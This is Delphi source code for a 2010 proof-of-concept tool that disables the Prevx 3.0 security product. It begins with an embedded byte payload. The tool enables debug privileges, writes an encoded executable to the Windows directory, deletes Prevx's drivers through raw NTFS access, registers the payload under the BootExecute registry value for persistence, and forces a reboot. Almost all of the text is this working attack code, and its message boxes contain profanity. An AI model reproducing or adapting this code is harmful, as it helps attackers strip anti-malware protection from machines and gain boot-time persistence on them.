    $17, $0C, $1B, $F9, $F1, $F3, $FA, $15, $F9, $F3, $F0, $01, $01, $E3, $E8, $E8,
    $49, $48, $B8, $46, $03, $F8, $00, $F2, $E4, $DE, $0F, $F0, $DA, $DD, $DE, $EB,
    $EA, $38, $D5, $EA, $D9, $D0, $CF, $10, $D5, $CC, $CB, $2E, $2D, $2C, $2B, $2A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A,
    $21, $48, $27, $66, $65, $64, $63, $62, $61, $60, $5F, $5E, $5D, $5C, $5B, $5A,
    $59, $58, $57, $56, $55, $54, $53, $52, $51, $50, $4F, $4E, $4D, $4C, $4B, $4A,
    $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E, $3D, $3C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $2D, $2C, $2B, $2A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A,
    $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E, $5D, $5C, $5B, $5A,
    $59, $58, $57, $56, $55, $54, $53, $52, $51, $50, $4F, $4E, $4D, $4C, $4B, $4A,
    $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E, $3D, $3C, $3B, $3A,
    $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E, $2D, $2C, $2B, $2A,
    $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E, $1D, $1C, $1B, $1A,
    $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E, $0D, $0C, $0B, $0A,
    $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE, $FD, $FC, $FB, $FA,
    $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE, $ED, $EC, $EB, $EA,
    $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE, $DD, $DC, $DB, $DA,
    $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE, $CD, $CC, $CB, $CA,
    $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE, $BD, $BC, $BB, $BA,
    $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE, $AD, $AC, $AB, $AA,
    $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E, $9D, $9C, $9B, $9A,
    $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E, $8D, $8C, $8B, $8A,
    $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E, $7D, $7C, $7B, $7A,
    $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E, $6D, $6C, $6B, $6A
    );

procedure EncodeBuffer(data: PBYTEBUF; size: DWORD; Key: BYTE); stdcall;
var
  c: integer;
begin
  for c := 0 to size do
    data^[c] := BYTE((not BYTE(data[c]) - c) xor Key);
end;

function TargetIsRunning(): BOOLEAN; stdcall;
var
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  id1: THANDLE;
begin
  result := false;
  RtlInitUnicodeString(@str1, '\??\pxscan');
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenSymbolicLinkObject(@id1, SYMBOLIC_LINK_QUERY, @attr) = STATUS_SUCCESS) then
  begin
    result := true;
    ZwClose(id1);
  end;
end;

function Install(): boolean;
var
  ns: NTSTATUS;
  bytesIO: DWORD;
  hKey: THANDLE;
  k, u: integer;
  DataSize, DataType: ULONG;
  inf1: PKEY_VALUE_FULL_INFORMATION;
  inf2: PKEY_VALUE_PARTIAL_INFORMATION;
begin
  result := false;
  memzero(@buf, sizeof(buf));
  strcpyW(buf, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(buf, TheEndExe);
  EncodeBuffer(@data, sizeof(Data), Key);
  bytesIO := Internal_WriteBufferToFile(buf, @data, sizeof(data), false);
  if (bytesIO = sizeof(Data)) then
  begin
    strcpyW(buf, KI_SHARED_USER_DATA.NtSystemRoot);
    strcatW(buf, '\system32\drivers\pxrts.sys');
    DirectNTFS.EraseFile_ntfs(buf);

    strcpyW(buf, KI_SHARED_USER_DATA.NtSystemRoot);
    strcatW(buf, '\system32\drivers\pxscan.sys');
    DirectNTFS.EraseFile_ntfs(buf);

    RtlInitUnicodeString(@str1, BootExecuteKey);
    InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
    if (ZwCreateKey(@hKey, KEY_ALL_ACCESS, @attr, 0, nil, REG_OPTION_NON_VOLATILE, @DataType) <> STATUS_SUCCESS) then exit;

    inf1 := @inbuf;
    RtlInitUnicodeString(@str1, BootExecuteValue);
    if (ZwQueryValueKey(hKey, @str1, KeyValueFullInformation,
      inf1, sizeof(inbuf), @DataSize) = STATUS_SUCCESS) then
    begin
      DataSize := inf1^.DataLength;
      DataType := REG_MULTI_SZ;
      memzero(@inbuf, sizeof(inbuf));
      inf2 := @inbuf;
      ZwQueryValueKey(hKey, @str1, KeyValuePartialInformation, inf2, sizeof(inbuf), @DataType);

      memzero(@outbuf, sizeof(outbuf));
      k := DataSize - sizeof(WCHAR) * 2; //remove #0#0
      memcopy(@outbuf, @inf2^.Data, k);
      u := strlenW(ValueToSet) * sizeof(WCHAR); //calculate new string len
      memcopy(@outbuf[k div sizeof(WCHAR) + 1], ValueToSet, u); //copy to resulting buffer
      k := k + u + (sizeof(WCHAR) * 2); //recalculate length
      ns := ZwSetValueKey(hKey, @str1, 0, REG_MULTI_SZ, @outbuf, k);
      if (ns = STATUS_SUCCESS) then result := true;
    end;
    ZwClose(hKey);
  end;
end;

function CheckStringIsPresentAndReturnStartIndex(Source: PWideChar; SourceSize: DWORD; ValueToLook: PWideChar): integer;
var
  i, k: ULONG;
begin
  result := -1;
  i := 0;
  if (SourceSize > 4192) or (Source = nil) or (ValueToLook = nil) then exit;
  while (i < SourceSize) do
  begin
    if (strcmpiW(Source, ValueToLook) = 0) then
    begin
      result := i;
      exit;
    end;
    k := strlenW(Source) + 1;
    inc(Source, k);
    inc(i, k);
  end;
end;

//Review delete operation!!!!

function Uninstall(): Boolean;
var
  hKey: THANDLE;
  i, k, u, s: ULONG;
  DataSize, DataType: ULONG;
  inf1: PKEY_VALUE_FULL_INFORMATION;
  inf2: PKEY_VALUE_PARTIAL_INFORMATION;
begin
  result := false;

  RtlInitUnicodeString(@str1, MutantName);
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  i := ZwCreateMutant(@Mutant, MUTANT_ALL_ACCESS, @attr, false);
  if (i = STATUS_SUCCESS) then
  begin
    NtSleep(2000);
  end;
  RtlInitUnicodeString(@str1, BootExecuteKey);
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwCreateKey(@hKey, KEY_ALL_ACCESS, @attr, 0, nil, REG_OPTION_NON_VOLATILE, @DataType) <> STATUS_SUCCESS) then exit;

  inf1 := @inbuf;
  RtlInitUnicodeString(@str1, BootExecuteValue);
  if (ZwQueryValueKey(hKey, @str1, KeyValueFullInformation,
    inf1, sizeof(inbuf), @DataSize) = STATUS_SUCCESS) then
  begin
    DataSize := inf1^.DataLength;
    memzero(@inbuf, sizeof(inbuf));
    memzero(@outbuf, sizeof(outbuf));
    inf2 := @inbuf;
    ZwQueryValueKey(hKey, @str1, KeyValuePartialInformation, inf2, sizeof(inbuf), @DataType);
    i := CheckStringIsPresentAndReturnStartIndex(@inf2^.Data, DataSize, ValueToSet);
    if (i <> $FFFFFFFF) then
    begin
      k := 0;
      u := 0;
      s := strlenW(ValueToSet);
      while (k < DataSize) do
      begin
        if (k < i) or (k > s + i) then
        begin
          outbuf[u] := PWideChar(@inf2^.Data)[k];
          inc(u);
        end;
        inc(k);
      end;
      u := DataSize - (s * sizeof(WCHAR)) - 2;
      ZwSetValueKey(hKey, @str1, 0, REG_MULTI_SZ, @outbuf, u);
    end;
  end;
  ZwClose(hKey);

  memzero(@buf, sizeof(buf));
  strcpyW(buf, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(buf, TheEndExe);
  result := Internal_RemoveFile(buf);
end;

function AlreadyInstalled(): boolean; stdcall;
begin
  memzero(@buf, sizeof(buf));
  strcpyW(buf, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(buf, TheEndExe);
  result := WinNative.Internal_FileExists(buf);
end;

begin
{$IFDEF debug}

  //install();
  //uninstall();
  exit;
{$ENDIF}
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then
  begin
    MessageBoxW(GetDesktopWindow(), 'Unsupported OS <Всем похуй>', nil, MB_OK);
    ExitProcess(0);
  end;

  if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, true, false) <> STATUS_SUCCESS) then
  begin
    MessageBoxW(GetDesktopWindow(), String1, Title, MB_OK);
    ExitProcess(0);
  end;
  if (Internal_AdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, true, false) <> STATUS_SUCCESS) then
  begin
    MessageBoxW(GetDesktopWindow(), String1, Title, MB_OK);
    ExitProcess(0);
  end;

  if (TargetIsRunning()) then
  begin
    if (AlreadyInstalled) then
    begin //uninstall
      if (MessageBoxW(GetDesktopWindow(), 'TheEnd installed, would you like to uninstall it?', Title, MB_YESNO) = IDYES) then
        if Uninstall() then MessageBoxW(GetDesktopWindow(), 'Uninstalled - OK', Title, MB_OK);
    end
    else //install
    begin
      if (MessageBoxW(GetDesktopWindow(), 'This is user mode proof-of-concept Prevx 3.0 kill'#13#10 +
        'Fucking handles/SSDT/Shadow SSDT will not help Prevx!'#13#13#10 +
        'Yes to perform attack, No to exit program'#13#10 +
        '(c) 2010 by EP_X0FF', Title, MB_YESNO) = IDNO) then exit;
      if Install() then
      begin
        MessageBoxW(0, 'Installed, reboot now', '', MB_OK);
        ExitWindowsEx(EWX_REBOOT or EWX_FORCE, 0);
      end;
    end;
  end else MessageBoxW(0, 'Prevx not found, start it first =)', Title, MB_OK);

  if (Mutant <> 0) then ZwClose(Mutant);

end.

